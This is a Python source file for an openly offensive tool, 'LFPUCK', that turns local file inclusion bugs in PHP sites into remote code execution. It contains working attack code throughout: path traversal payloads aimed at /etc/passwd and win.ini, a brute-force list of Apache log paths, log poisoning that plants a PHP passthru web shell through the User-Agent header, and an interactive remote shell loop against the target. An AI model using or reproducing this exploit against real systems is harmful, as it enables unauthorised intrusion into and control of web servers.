#-------------------------------------------------------------------------------
# Name:        LFPUCK.py
# Purpose:     Turn LFI to code execution
# Version:     1.2
# 
# Author:      0xSha
#
# Created:     30/01/2013
# Copyright:   (c) 0xsha.io 2013
# Licence:     GPV v3
#-------------------------------------------------------------------------------
#!/usr/bin/env python

# Todo
# 1- add support php://filter/convert.base64-encode/resource=
# 2- add /proc/fd/num
# 3- add /proc/self/environ
# 4- add php://input
# 5- add intersting files (FTP/PASSWD)
# 6- add phpinfo test
# 7- add crawler (maybe)



# itermezzo coding style o_O

import urlparse
import requests
import sys
import re
import pprint
import sys

OS = "unix"

if OS == "win":
        __inject__ = "../../../../../../../windows/win.ini"
        __nullinject__ = "../../../../../../../windows/win.ini%00"

if OS == "unix":
        __inject__ = "../../../../../../../../etc/passwd"
        __nullinject__ = "../../../../../../../etc/passwd%00"




def help():
    '''help function

    this is just help function
    '''
    print "LFFUCK Turn LFI to RCE by @ShahinRamezany "
    print "Usage : LFPUCK.py www.host.com/file.php?param=1&param=2&param=3"


# some default paths
unix_paths = [
        "/xampp/apache/logs/access.log",
        "/etc/httpd/logs/access_log",
        "/apache/logs/access.log",
        "/apache/logs/access.log",
        "/apache/logs/error.log",
        "/etc/httpd/logs/acces.log",
        "/etc/httpd/logs/access.log",
        "/etc/httpd/logs/error.log",
        "/etc/httpd/logs/error_log",
        "/logs/access.log",
        "/logs/error.log",
        "/usr/local/apache/logs/access.log",
        "/usr/local/apache/logs/access_log",
        "/usr/local/apache/logs/error.log",
        "/usr/local/apache/logs/error_log",
        "/usr/local/apache2/logs/access.log",
        "/usr/local/apache2/logs/access_log",
        "/usr/local/apache2/logs/error.log",
        "/usr/local/apache2/logs/error_log",
        "/var/log/access_log",
        "/var/log/apache/access.log",
        "/var/log/apache/access_log",
        "/var/log/apache/error.log",
        "/var/log/apache/error_log",
        "/var/log/apache2/access.log",
        "/var/log/apache2/access_log",
        "/var/log/apache2/error.log",
        "/var/log/apache2/error_log",
        "/var/log/error_log",
        "/var/log/httpd/access.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/error.log",
        "/var/log/httpd/error_log",
        "/var/www/logs/access.log",
        "/var/www/logs/access_log",
        "/var/www/logs/error.log",
        "/var/www/logs/error_log",
        "/opt/xampp/logs/access_log",
        "/opt/lampp/logs/access.log",
        "/var/log/httpd/access_log"]

def SendInfectedAgent(url):
    '''
    inject malicious user-agent and try to get a shell
    @url : url to inject 
    @return :  nothing 
    '''
    phpcode = r"""<?php if(get_magic_quotes_gpc()){ $_GET[cmd]=stripslashes($_GET[cmd]);} echo '################################'; passthru($_GET[cmd]); echo '################################';?>"""
    requests.get(url+"/Mr.Shahin.MR",headers={"User-agent":phpcode})

    print "[+] payload injected lets see if we have a shell ... "

    while True:
        # tring to get shell
        try:
            inputstr = raw_input("shell # ")
            shellreq = requests.get(url+"&cmd="+inputstr)
            x = str(shellreq.text)
            off  = x.find("################################")
            if off != -1:
                off2 = x[off+32:]
                off3 = off2.find("################################")
                final = off2[:off3]
                print final
            else:
                print "[-] Try manually ... " , url
                break
            if inputstr.strip().lower() == 'exit':
                    print "[~] bye bye ..."
                    break
        except:
            break




def MakeDots(fpath):
    '''
    Make unix paths for injection
    @fpath  : file path to read 
    @reutrn : list with dot dot slash  
    '''
    lst  = []
    lstslash = []

    for path in fpath:
        for j in xrange(0,10):
            lst.append("../" * j + path)

    for l in lst:
        lstslash.append(l.replace("//","/"))

    return lstslash


def LogRes(strs):
    ''' 
    search for usefull log
    @strs : strings to do regex 
    @return : True if found  False if not found 
    '''
    # UNIX search
    unixsearch = re.findall(":x:",strs,re.I)
    # BSD search
    bsdsearch = re.findall(":\*:",strs,re.I)

    # Windows search
    win5search = re.findall("\[operating",strs,re.I)
    win6search = re.findall("MPEGVideo",strs,re.I)

    # log search
    logsearch = re.findall("HTTP/",strs,re.I)

    if  len(unixsearch) < 1 and len(bsdsearch) < 1 and len(win5search) < 1 and len(win6search) < 1 and len(logsearch) < 1 :
            return False
    else:
            return True



def InjectLog(url):
    '''
    log injector
    @url : url to do log injection
    @return : nothing 
    '''
    for path in MakeDots(unix_paths):
                    inj = url.replace("Inject_Here",path)
                    print inj
                    loginject = requests.get(inj)

                    if  LogRes(loginject.text):
                        print "[+] found log injection in without null "  , path
                        return inj
                        break
                    else:
                        pass
                        #print "[-] seems not exploitable without null with path :  " , path


def FindPHPINFO(url):
    # i will write it so soon
    print "will work"

def CheckForVuln(url):
    '''
    Very simple vulnerability checker 
    @url : url to check vulns in 
    @return : nothing 
    '''

    parser = urlparse.urlparse(url)
    queries =  parser.query
    lstqueries = str(queries).split("&")
    print "[+] Trying to inject to " , ' & '.join(lstqueries[0:])


    lst = []
    for injectable in  lstqueries:
         injectable = injectable.split("=")
         lst.append(injectable[0])

    for i in range(len(lstqueries)):

                nonullinject = "http://" + parser.netloc + parser.path + "?" + '&'.join(lstqueries[0:i]) + "&" + lst[i] + "=" + __inject__.replace("?&","?")
                print nonullinject
                nonull = requests.get(nonullinject)

                nullinject = "http://" + parser.netloc + parser.path + "?" + '&'.join(lstqueries[0:i]) + "&" + lst[i] + "=" + __nullinject__.replace("?&","?")
                print nullinject
                withnull = requests.get(nullinject)


                if  LogRes(nonull.text):
                    print "[+] W00T seems exploitable without null with param :  " + "http://" + parser.netloc + parser.path + "?" + '&'.join(lstqueries[0:i]) + "&" + lst[i] + "=" + "Inject_Here"
                    return "http://" + parser.netloc + parser.path + "?" + '&'.join(lstqueries[0:i]) + "&" + lst[i] + "=" + "Inject_Here"
                else:
                    pass
                    #print "[-] seems not exploitable without null :( with " , lst[i]

                if  LogRes(withnull.text):
                    print "[+] W00T seems exploitable with null with param : " , lst[i]
                    return "http://" + parser.netloc + parser.path + "?" + '&'.join(lstqueries[0:i]) + "&" + lst[i] + "=" + "Inject_Here%00"
                else:
                    #print "[-] seems not exploitable with null too :( with " , lst[i]
                    pass

if __name__ == '__main__':

    # start injection 
    if len(sys.argv) <> 2:
        print
        help()
        sys.exit(1)
    else:
         url = sys.argv[1]
         # step 1
         vurl = CheckForVuln(url)

         if vurl:
            # step 2
            injres = InjectLog(vurl)
            if injres:
                # step 3
                SendInfectedAgent(injres)
            else:
                print "[-] Failed :("

         else:
            print "[-] Failed :("


